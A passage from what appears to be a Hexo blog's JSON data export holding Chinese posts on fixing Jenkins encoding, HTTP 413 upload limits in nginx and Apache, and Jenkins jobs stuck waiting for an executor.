jenkins代码部署位置\n/var/cache/jenkins/war\n\n5. jenkins服务端口\nhttp: 8080\najp13: 8009\n\n6. jenkins servlet容器\njenkins服务运行在winstone servlet容器，类似于tomcat, jetty等。\njenkins命令启动接收的参数`--logfile`, `--webroot`, `--httpPort`, `--ajp13Port`等都是winstone的。\n另外，查看了webroot参数对应的目录，发现目录包含类库**winstone.jar**，也可知jenkins可能是放在winstone容器里运行的。\n\n关于winstone可参考：[Winstone Servlet Container v0.9.10][^6]\n\n\n\n[^1]: http://blog.csdn.net/hunterno4/article/details/38424715\n[^2]: http://lee2013.iteye.com/blog/2108612\n[^3]: http://zhidao.baidu.com/question/177248555728533364.html\n[^4]: http://lee2013.iteye.com/blog/2108612\n[^5]: http://www.xuebuyuan.com/2108588.html\n[^6]: http://winstone.sourceforge.net/\n\n","slug":"article/jenkins/jenkins中文乱码与服务启动","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxs6003g5nbt2zs8lc0y","content":"<p><img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h2><p>项目构建<strong>最新修改记录</strong>中文乱码。</p>\n<h2 id=\"问题查看与分析\"><a href=\"#问题查看与分析\" class=\"headerlink\" title=\"问题查看与分析\"></a>问题查看与分析</h2><p>首先，查看jenkins管理界面的<strong>系统属性</strong>功能。<br>对应URL地址为：<a href=\"http://jenkins.go.sohuno.com/systemInfo\" target=\"_blank\" rel=\"external\">http://jenkins.go.sohuno.com/systemInfo</a></p>\n<p>可以看到jenkins启动环境变量file.encoding值为默认的<strong>ISO-8859-1</strong>(Latin-1字符集)。<br>不希望jenkins乱码，需要设置其编码方式为UTF-8。(参考：<a href=\"http://blog.csdn.net/hunterno4/article/details/38424715\" target=\"_blank\" rel=\"external\">Jenkins控制台中乱码问题</a>)</p>\n<h2 id=\"问题解决\"><a href=\"#问题解决\" class=\"headerlink\" title=\"问题解决\"></a>问题解决</h2><p>当前jenkins启动命令为：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">java -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20</div></pre></td></tr></table></figure></p>\n<p>在启动jenkins时，需要额外添加参数<strong>file.encoding</strong>，并设置其参数值为UTF-8。<br>修改后的启动命令如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">java -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20 -Dfile.encoding=UTF-8</div></pre></td></tr></table></figure></p>\n<h3 id=\"扩展说明\"><a href=\"#扩展说明\" class=\"headerlink\" title=\"扩展说明\"></a>扩展说明</h3><p>由jenkins启动命令可看出：</p>\n<ol>\n<li><p>jenkins安装目录<br>/var/lib/jenkins</p>\n</li>\n<li><p>jenkins服务部署代码<br>/usr/lib/jenkins/jenkins.war</p>\n</li>\n<li><p>运行日志<br>/var/log/jenkins/jenkins.log</p>\n</li>\n<li><p>jenkins代码部署位置<br>/var/cache/jenkins/war</p>\n</li>\n<li><p>jenkins服务端口<br>http: 8080<br>ajp13: 8009</p>\n</li>\n<li><p>jenkins servlet容器<br>jenkins服务运行在winstone servlet容器，类似于tomcat, jetty等。<br>jenkins命令启动接收的参数<code>--logfile</code>, <code>--webroot</code>, <code>--httpPort</code>, <code>--ajp13Port</code>等都是winstone的。<br>另外，查看了webroot参数对应的目录，发现目录包含类库<strong>winstone.jar</strong>，也可知jenkins可能是放在winstone容器里运行的。</p>\n</li>\n</ol>\n<p>关于winstone可参考：<a href=\"http://winstone.sourceforge.net/\" target=\"_blank\" rel=\"external\">Winstone Servlet Container v0.9.10</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h2><p>项目构建<strong>最新修改记录</strong>中文乱码。</p>\n<h2 id=\"问题查看与分析\"><a href=\"#问题查看与分析\" class=\"headerlink\" title=\"问题查看与分析\"></a>问题查看与分析</h2><p>首先，查看jenkins管理界面的<strong>系统属性</strong>功能。<br>对应URL地址为：<a href=\"http://jenkins.go.sohuno.com/systemInfo\">http://jenkins.go.sohuno.com/systemInfo</a></p>\n<p>可以看到jenkins启动环境变量file.encoding值为默认的<strong>ISO-8859-1</strong>(Latin-1字符集)。<br>不希望jenkins乱码，需要设置其编码方式为UTF-8。(参考：<a href=\"http://blog.csdn.net/hunterno4/article/details/38424715\">Jenkins控制台中乱码问题</a>)</p>\n<h2 id=\"问题解决\"><a href=\"#问题解决\" class=\"headerlink\" title=\"问题解决\"></a>问题解决</h2><p>当前jenkins启动命令为：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">java -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20</div></pre></td></tr></table></figure></p>\n<p>在启动jenkins时，需要额外添加参数<strong>file.encoding</strong>，并设置其参数值为UTF-8。<br>修改后的启动命令如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">java -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20 -Dfile.encoding=UTF-8</div></pre></td></tr></table></figure></p>\n<h3 id=\"扩展说明\"><a href=\"#扩展说明\" class=\"headerlink\" title=\"扩展说明\"></a>扩展说明</h3><p>由jenkins启动命令可看出：</p>\n<ol>\n<li><p>jenkins安装目录<br>/var/lib/jenkins</p>\n</li>\n<li><p>jenkins服务部署代码<br>/usr/lib/jenkins/jenkins.war</p>\n</li>\n<li><p>运行日志<br>/var/log/jenkins/jenkins.log</p>\n</li>\n<li><p>jenkins代码部署位置<br>/var/cache/jenkins/war</p>\n</li>\n<li><p>jenkins服务端口<br>http: 8080<br>ajp13: 8009</p>\n</li>\n<li><p>jenkins servlet容器<br>jenkins服务运行在winstone servlet容器，类似于tomcat, jetty等。<br>jenkins命令启动接收的参数<code>--logfile</code>, <code>--webroot</code>, <code>--httpPort</code>, <code>--ajp13Port</code>等都是winstone的。<br>另外，查看了webroot参数对应的目录，发现目录包含类库<strong>winstone.jar</strong>，也可知jenkins可能是放在winstone容器里运行的。</p>\n</li>\n</ol>\n<p>关于winstone可参考：<a href=\"http://winstone.sourceforge.net/\">Winstone Servlet Container v0.9.10</a></p>\n"},{"title":"request entity too large","date":"2016-07-18T06:24:00.000Z","_content":"\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n## 一、问题描述\n拍照上传图片时，系统提示: request entity too large，错误码为413。\n\n\n## 二、问题分析\n翻阅http状态码查看413解释如下:\n\n> 413 Request entity too large\nThe request is larger than what the server is able to process.\n\n由此可知，应该是上传照片超过服务器的限制。\n\n\n\n## 三、解决方案\n\n### 1. 解除域名服务器限制\n一般情况下，域名服务器选用apache和nginx比较多。\n\n#### apache\n对apache服务器而言，相关参数为: `LimitRequestBody`\n默认值为0，表示最大2GB。\n\n官方解释如下:\n```\nDescription:\tRestricts the total size of the HTTP request body sent from the client\nSyntax:\tLimitRequestBody bytes\nDefault:\tLimitRequestBody 0\nContext:\tserver config, virtual host, directory, .htaccess\nOverride:\tAll\nStatus:\tCore\nModule:\tcore\n```\n\n<!-- more -->\n\n> This directive specifies the number of bytes from 0 (meaning unlimited) to 2147483647 (2GB) that are allowed in a request body.\nThe LimitRequestBody directive allows the user to set a limit on the allowed size of an HTTP request message body within the context in which the directive is given (server, per-directory, per-file or per-location). If the client request exceeds that limit, the server will return an error response instead of servicing the request. The size of a normal request message body will vary greatly depending on the nature of the resource and the methods allowed on that resource. CGI scripts typically use the message body for retrieving form information. Implementations of the PUT method will require a value at least as large as any representation that the server wishes to accept for that resource.\nThis directive gives the server administrator greater control over abnormal client request behavior, which may be useful for avoiding some forms of denial-of-service attacks.\nIf, for example, you are permitting file upload to a particular location, and wish to limit the size of the uploaded file to 100K, you might use the following directive: LimitRequestBody 102400\n\n#### nginx\n对nginx服务器而言，相关参数为: `client_max_body_size` \n默认值为1M。\n\n官方解释如下:\n```\nSyntax:\t\tclient_max_body_size size;\nDefault:\tclient_max_body_size 1m;\nContext:\thttp, server, location\n```\n> Sets the maximum allowed size of the client request body, specified in the “Content-Length” request header field. If the size in a request exceeds the configured value, the 413 (Request Entity Too Large) error is returned to the client. Please be aware that browsers cannot correctly display this error. Setting size to 0 disables checking of client request body size.\n\n### 2. 解除应用服务器限制\njava的应用程序的话，目前使用较多的还是tomcat和jetty两类服务器。\n由于遇到的问题是nginx默认限制文件上传大小为1M导致，此类情况暂时不深研。\n\n### 3. 解除应用自身限制\nspring容器注入multipartResolver\n如下设置，默认不限制文件上传大小。\n如果需要做限制的话，可以设置maxUploadSize参数，用来限制文件上传大小(单位:bytes)。\n``` xml\n<bean id=\"multipartResolver\"\n          class=\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"/>\n```\n\n\n## 四、参考文档\n1. [http://craftcms.stackexchange.com/a/2330](http://craftcms.stackexchange.com/a/2330)\n2. [limitrequestbody](http://httpd.apache.org/docs/2.0/mod/core.html#limitrequestbody)\n3. [client_max_body_size](http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size)","source":"_posts/article/java/request entity too large.md","raw":"title: request entity too large\ntags:\n  - java\ncategories:\n  - 后端开发\ndate: 2016-07-18 14:24:00\n---\n\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n## 一、问题描述\n拍照上传图片时，系统提示: request entity too large，错误码为413。\n\n\n## 二、问题分析\n翻阅http状态码查看413解释如下:\n\n> 413 Request entity too large\nThe request is larger than what the server is able to process.\n\n由此可知，应该是上传照片超过服务器的限制。\n\n\n\n## 三、解决方案\n\n### 1. 解除域名服务器限制\n一般情况下，域名服务器选用apache和nginx比较多。\n\n#### apache\n对apache服务器而言，相关参数为: `LimitRequestBody`\n默认值为0，表示最大2GB。\n\n官方解释如下:\n```\nDescription:\tRestricts the total size of the HTTP request body sent from the client\nSyntax:\tLimitRequestBody bytes\nDefault:\tLimitRequestBody 0\nContext:\tserver config, virtual host, directory, .htaccess\nOverride:\tAll\nStatus:\tCore\nModule:\tcore\n```\n\n<!-- more -->\n\n> This directive specifies the number of bytes from 0 (meaning unlimited) to 2147483647 (2GB) that are allowed in a request body.\nThe LimitRequestBody directive allows the user to set a limit on the allowed size of an HTTP request message body within the context in which the directive is given (server, per-directory, per-file or per-location). If the client request exceeds that limit, the server will return an error response instead of servicing the request. The size of a normal request message body will vary greatly depending on the nature of the resource and the methods allowed on that resource. CGI scripts typically use the message body for retrieving form information. Implementations of the PUT method will require a value at least as large as any representation that the server wishes to accept for that resource.\nThis directive gives the server administrator greater control over abnormal client request behavior, which may be useful for avoiding some forms of denial-of-service attacks.\nIf, for example, you are permitting file upload to a particular location, and wish to limit the size of the uploaded file to 100K, you might use the following directive: LimitRequestBody 102400\n\n#### nginx\n对nginx服务器而言，相关参数为: `client_max_body_size` \n默认值为1M。\n\n官方解释如下:\n```\nSyntax:\t\tclient_max_body_size size;\nDefault:\tclient_max_body_size 1m;\nContext:\thttp, server, location\n```\n> Sets the maximum allowed size of the client request body, specified in the “Content-Length” request header field. If the size in a request exceeds the configured value, the 413 (Request Entity Too Large) error is returned to the client. Please be aware that browsers cannot correctly display this error. Setting size to 0 disables checking of client request body size.\n\n### 2. 解除应用服务器限制\njava的应用程序的话，目前使用较多的还是tomcat和jetty两类服务器。\n由于遇到的问题是nginx默认限制文件上传大小为1M导致，此类情况暂时不深研。\n\n### 3. 解除应用自身限制\nspring容器注入multipartResolver\n如下设置，默认不限制文件上传大小。\n如果需要做限制的话，可以设置maxUploadSize参数，用来限制文件上传大小(单位:bytes)。\n``` xml\n<bean id=\"multipartResolver\"\n          class=\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"/>\n```\n\n\n## 四、参考文档\n1. [http://craftcms.stackexchange.com/a/2330](http://craftcms.stackexchange.com/a/2330)\n2. [limitrequestbody](http://httpd.apache.org/docs/2.0/mod/core.html#limitrequestbody)\n3. [client_max_body_size](http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size)","slug":"article/java/request entity too large","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxs7003j5nbtey6xddka","content":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、问题描述\"><a href=\"#一、问题描述\" class=\"headerlink\" title=\"一、问题描述\"></a>一、问题描述</h2><p>拍照上传图片时，系统提示: request entity too large，错误码为413。</p>\n<h2 id=\"二、问题分析\"><a href=\"#二、问题分析\" class=\"headerlink\" title=\"二、问题分析\"></a>二、问题分析</h2><p>翻阅http状态码查看413解释如下:</p>\n<blockquote>\n<p>413 Request entity too large<br>The request is larger than what the server is able to process.</p>\n</blockquote>\n<p>由此可知，应该是上传照片超过服务器的限制。</p>\n<h2 id=\"三、解决方案\"><a href=\"#三、解决方案\" class=\"headerlink\" title=\"三、解决方案\"></a>三、解决方案</h2><h3 id=\"1-解除域名服务器限制\"><a href=\"#1-解除域名服务器限制\" class=\"headerlink\" title=\"1. 解除域名服务器限制\"></a>1. 解除域名服务器限制</h3><p>一般情况下，域名服务器选用apache和nginx比较多。</p>\n<h4 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h4><p>对apache服务器而言，相关参数为: <code>LimitRequestBody</code><br>默认值为0，表示最大2GB。</p>\n<p>官方解释如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Description:\tRestricts the total size of the HTTP request body sent from the client</div><div class=\"line\">Syntax:\tLimitRequestBody bytes</div><div class=\"line\">Default:\tLimitRequestBody 0</div><div class=\"line\">Context:\tserver config, virtual host, directory, .htaccess</div><div class=\"line\">Override:\tAll</div><div class=\"line\">Status:\tCore</div><div class=\"line\">Module:\tcore</div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<blockquote>\n<p>This directive specifies the number of bytes from 0 (meaning unlimited) to 2147483647 (2GB) that are allowed in a request body.<br>The LimitRequestBody directive allows the user to set a limit on the allowed size of an HTTP request message body within the context in which the directive is given (server, per-directory, per-file or per-location). If the client request exceeds that limit, the server will return an error response instead of servicing the request. The size of a normal request message body will vary greatly depending on the nature of the resource and the methods allowed on that resource. CGI scripts typically use the message body for retrieving form information. Implementations of the PUT method will require a value at least as large as any representation that the server wishes to accept for that resource.<br>This directive gives the server administrator greater control over abnormal client request behavior, which may be useful for avoiding some forms of denial-of-service attacks.<br>If, for example, you are permitting file upload to a particular location, and wish to limit the size of the uploaded file to 100K, you might use the following directive: LimitRequestBody 102400</p>\n</blockquote>\n<h4 id=\"nginx\"><a href=\"#nginx\" class=\"headerlink\" title=\"nginx\"></a>nginx</h4><p>对nginx服务器而言，相关参数为: <code>client_max_body_size</code><br>默认值为1M。</p>\n<p>官方解释如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">Syntax:\t\tclient_max_body_size size;</div><div class=\"line\">Default:\tclient_max_body_size 1m;</div><div class=\"line\">Context:\thttp, server, location</div></pre></td></tr></table></figure></p>\n<blockquote>\n<p>Sets the maximum allowed size of the client request body, specified in the “Content-Length” request header field. If the size in a request exceeds the configured value, the 413 (Request Entity Too Large) error is returned to the client. Please be aware that browsers cannot correctly display this error. Setting size to 0 disables checking of client request body size.</p>\n</blockquote>\n<h3 id=\"2-解除应用服务器限制\"><a href=\"#2-解除应用服务器限制\" class=\"headerlink\" title=\"2. 解除应用服务器限制\"></a>2. 解除应用服务器限制</h3><p>java的应用程序的话，目前使用较多的还是tomcat和jetty两类服务器。<br>由于遇到的问题是nginx默认限制文件上传大小为1M导致，此类情况暂时不深研。</p>\n<h3 id=\"3-解除应用自身限制\"><a href=\"#3-解除应用自身限制\" class=\"headerlink\" title=\"3. 解除应用自身限制\"></a>3. 解除应用自身限制</h3><p>spring容器注入multipartResolver<br>如下设置，默认不限制文件上传大小。<br>如果需要做限制的话，可以设置maxUploadSize参数，用来限制文件上传大小(单位:bytes)。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"multipartResolver\"</span></span></div><div class=\"line\">          <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"</span>/&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ol>\n<li><a href=\"http://craftcms.stackexchange.com/a/2330\" target=\"_blank\" rel=\"external\">http://craftcms.stackexchange.com/a/2330</a></li>\n<li><a href=\"http://httpd.apache.org/docs/2.0/mod/core.html#limitrequestbody\" target=\"_blank\" rel=\"external\">limitrequestbody</a></li>\n<li><a href=\"http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size\" target=\"_blank\" rel=\"external\">client_max_body_size</a></li>\n</ol>\n","excerpt":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、问题描述\"><a href=\"#一、问题描述\" class=\"headerlink\" title=\"一、问题描述\"></a>一、问题描述</h2><p>拍照上传图片时，系统提示: request entity too large，错误码为413。</p>\n<h2 id=\"二、问题分析\"><a href=\"#二、问题分析\" class=\"headerlink\" title=\"二、问题分析\"></a>二、问题分析</h2><p>翻阅http状态码查看413解释如下:</p>\n<blockquote>\n<p>413 Request entity too large<br>The request is larger than what the server is able to process.</p>\n</blockquote>\n<p>由此可知，应该是上传照片超过服务器的限制。</p>\n<h2 id=\"三、解决方案\"><a href=\"#三、解决方案\" class=\"headerlink\" title=\"三、解决方案\"></a>三、解决方案</h2><h3 id=\"1-解除域名服务器限制\"><a href=\"#1-解除域名服务器限制\" class=\"headerlink\" title=\"1. 解除域名服务器限制\"></a>1. 解除域名服务器限制</h3><p>一般情况下，域名服务器选用apache和nginx比较多。</p>\n<h4 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h4><p>对apache服务器而言，相关参数为: <code>LimitRequestBody</code><br>默认值为0，表示最大2GB。</p>\n<p>官方解释如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Description:\tRestricts the total size of the HTTP request body sent from the client</div><div class=\"line\">Syntax:\tLimitRequestBody bytes</div><div class=\"line\">Default:\tLimitRequestBody 0</div><div class=\"line\">Context:\tserver config, virtual host, directory, .htaccess</div><div class=\"line\">Override:\tAll</div><div class=\"line\">Status:\tCore</div><div class=\"line\">Module:\tcore</div></pre></td></tr></table></figure></p>","more":"<blockquote>\n<p>This directive specifies the number of bytes from 0 (meaning unlimited) to 2147483647 (2GB) that are allowed in a request body.<br>The LimitRequestBody directive allows the user to set a limit on the allowed size of an HTTP request message body within the context in which the directive is given (server, per-directory, per-file or per-location). If the client request exceeds that limit, the server will return an error response instead of servicing the request. The size of a normal request message body will vary greatly depending on the nature of the resource and the methods allowed on that resource. CGI scripts typically use the message body for retrieving form information. Implementations of the PUT method will require a value at least as large as any representation that the server wishes to accept for that resource.<br>This directive gives the server administrator greater control over abnormal client request behavior, which may be useful for avoiding some forms of denial-of-service attacks.<br>If, for example, you are permitting file upload to a particular location, and wish to limit the size of the uploaded file to 100K, you might use the following directive: LimitRequestBody 102400</p>\n</blockquote>\n<h4 id=\"nginx\"><a href=\"#nginx\" class=\"headerlink\" title=\"nginx\"></a>nginx</h4><p>对nginx服务器而言，相关参数为: <code>client_max_body_size</code><br>默认值为1M。</p>\n<p>官方解释如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">Syntax:\t\tclient_max_body_size size;</div><div class=\"line\">Default:\tclient_max_body_size 1m;</div><div class=\"line\">Context:\thttp, server, location</div></pre></td></tr></table></figure></p>\n<blockquote>\n<p>Sets the maximum allowed size of the client request body, specified in the “Content-Length” request header field. If the size in a request exceeds the configured value, the 413 (Request Entity Too Large) error is returned to the client. Please be aware that browsers cannot correctly display this error. Setting size to 0 disables checking of client request body size.</p>\n</blockquote>\n<h3 id=\"2-解除应用服务器限制\"><a href=\"#2-解除应用服务器限制\" class=\"headerlink\" title=\"2. 解除应用服务器限制\"></a>2. 解除应用服务器限制</h3><p>java的应用程序的话，目前使用较多的还是tomcat和jetty两类服务器。<br>由于遇到的问题是nginx默认限制文件上传大小为1M导致，此类情况暂时不深研。</p>\n<h3 id=\"3-解除应用自身限制\"><a href=\"#3-解除应用自身限制\" class=\"headerlink\" title=\"3. 解除应用自身限制\"></a>3. 解除应用自身限制</h3><p>spring容器注入multipartResolver<br>如下设置，默认不限制文件上传大小。<br>如果需要做限制的话，可以设置maxUploadSize参数，用来限制文件上传大小(单位:bytes)。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"multipartResolver\"</span></div><div class=\"line\">          <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"</span>/&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ol>\n<li><a href=\"http://craftcms.stackexchange.com/a/2330\">http://craftcms.stackexchange.com/a/2330</a></li>\n<li><a href=\"http://httpd.apache.org/docs/2.0/mod/core.html#limitrequestbody\">limitrequestbody</a></li>\n<li><a href=\"http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size\">client_max_body_size</a></li>\n</ol>"},{"title":"jenkins任务等待下一次可用执行","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n英文：pending-waiting for next available executor\n\n## 问题分析\n查阅网上的资料，出现pending-waiting for next available executor的情况主要有二：\n\n### 磁盘存储空间已满\n1. jenkins所在的服务器\n2. 任务运行涉及到的slave服务器\n\n### 节点离线\njenkins服务正常时，master节点有可能处于离线状态。此时，可以进入系统管理->管理节点，查看一下节点状态。\n![节点状态](http://7xkl4i.com1.z0.glb.clouddn.com/jenkins_node_status.png)\n\n\n## 问题解决\n\n### jenkins所在服务器\n重启jenkins服务后，可能需要过段时间节点才会正常加载并工作。\n\n### 任务运行涉及到的slave服务器\n重启过程导致slave服务器连接master失败，可以考虑重启一下jenkins slave服务。\n\n\n## 参考文档\n1. http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor\n2. http://blog.csdn.net/jinhuiyu/article/details/4827051\n","source":"_posts/article/jenkins/jenkins任务等待下一次可用执行.md","raw":"categories:\n  - 持续集成\ntags:\n  - jenkins\n  - issue\ntitle: jenkins任务等待下一次可用执行\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n英文：pending-waiting for next available executor\n\n## 问题分析\n查阅网上的资料，出现pending-waiting for next available executor的情况主要有二：\n\n### 磁盘存储空间已满\n1. jenkins所在的服务器\n2. 任务运行涉及到的slave服务器\n\n### 节点离线\njenkins服务正常时，master节点有可能处于离线状态。此时，可以进入系统管理->管理节点，查看一下节点状态。\n![节点状态](http://7xkl4i.com1.z0.glb.clouddn.com/jenkins_node_status.png)\n\n\n## 问题解决\n\n### jenkins所在服务器\n重启jenkins服务后，可能需要过段时间节点才会正常加载并工作。\n\n### 任务运行涉及到的slave服务器\n重启过程导致slave服务器连接master失败，可以考虑重启一下jenkins slave服务。\n\n\n## 参考文档\n1. http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor\n2. http://blog.csdn.net/jinhuiyu/article/details/4827051\n","slug":"article/jenkins/jenkins任务等待下一次可用执行","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxsd003n5nbtmrq6y2d1","content":"<p><img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\"></p>\n<p>英文：pending-waiting for next available executor</p>\n<h2 id=\"问题分析\"><a href=\"#问题分析\" class=\"headerlink\" title=\"问题分析\"></a>问题分析</h2><p>查阅网上的资料，出现pending-waiting for next available executor的情况主要有二：</p>\n<h3 id=\"磁盘存储空间已满\"><a href=\"#磁盘存储空间已满\" class=\"headerlink\" title=\"磁盘存储空间已满\"></a>磁盘存储空间已满</h3><ol>\n<li>jenkins所在的服务器</li>\n<li>任务运行涉及到的slave服务器</li>\n</ol>\n<h3 id=\"节点离线\"><a href=\"#节点离线\" class=\"headerlink\" title=\"节点离线\"></a>节点离线</h3><p>jenkins服务正常时，master节点有可能处于离线状态。此时，可以进入系统管理-&gt;管理节点，查看一下节点状态。<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/jenkins_node_status.png\" alt=\"节点状态\"></p>\n<h2 id=\"问题解决\"><a href=\"#问题解决\" class=\"headerlink\" title=\"问题解决\"></a>问题解决</h2><h3 id=\"jenkins所在服务器\"><a href=\"#jenkins所在服务器\" class=\"headerlink\" title=\"jenkins所在服务器\"></a>jenkins所在服务器</h3><p>重启jenkins服务后，可能需要过段时间节点才会正常加载并工作。</p>\n<h3 id=\"任务运行涉及到的slave服务器\"><a href=\"#任务运行涉及到的slave服务器\" class=\"headerlink\" title=\"任务运行涉及到的slave服务器\"></a>任务运行涉及到的slave服务器</h3><p>重启过程导致slave服务器连接master失败，可以考虑重启一下jenkins slave服务。</p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor\" target=\"_blank\" rel=\"external\">http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor</a></li>\n<li><a href=\"http://blog.csdn.net/jinhuiyu/article/details/4827051\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/jinhuiyu/article/details/4827051</a></li>\n</ol>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" /></p>\n<p>英文：pending-waiting for next available executor</p>\n<h2 id=\"问题分析\"><a href=\"#问题分析\" class=\"headerlink\" title=\"问题分析\"></a>问题分析</h2><p>查阅网上的资料，出现pending-waiting for next available executor的情况主要有二：</p>\n<h3 id=\"磁盘存储空间已满\"><a href=\"#磁盘存储空间已满\" class=\"headerlink\" title=\"磁盘存储空间已满\"></a>磁盘存储空间已满</h3><ol>\n<li>jenkins所在的服务器</li>\n<li>任务运行涉及到的slave服务器</li>\n</ol>\n<h3 id=\"节点离线\"><a href=\"#节点离线\" class=\"headerlink\" title=\"节点离线\"></a>节点离线</h3><p>jenkins服务正常时，master节点有可能处于离线状态。此时，可以进入系统管理-&gt;管理节点，查看一下节点状态。<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/jenkins_node_status.png\" alt=\"节点状态\"></p>\n<h2 id=\"问题解决\"><a href=\"#问题解决\" class=\"headerlink\" title=\"问题解决\"></a>问题解决</h2><h3 id=\"jenkins所在服务器\"><a href=\"#jenkins所在服务器\" class=\"headerlink\" title=\"jenkins所在服务器\"></a>jenkins所在服务器</h3><p>重启jenkins服务后，可能需要过段时间节点才会正常加载并工作。</p>\n<h3 id=\"任务运行涉及到的slave服务器\"><a href=\"#任务运行涉及到的slave服务器\" class=\"headerlink\" 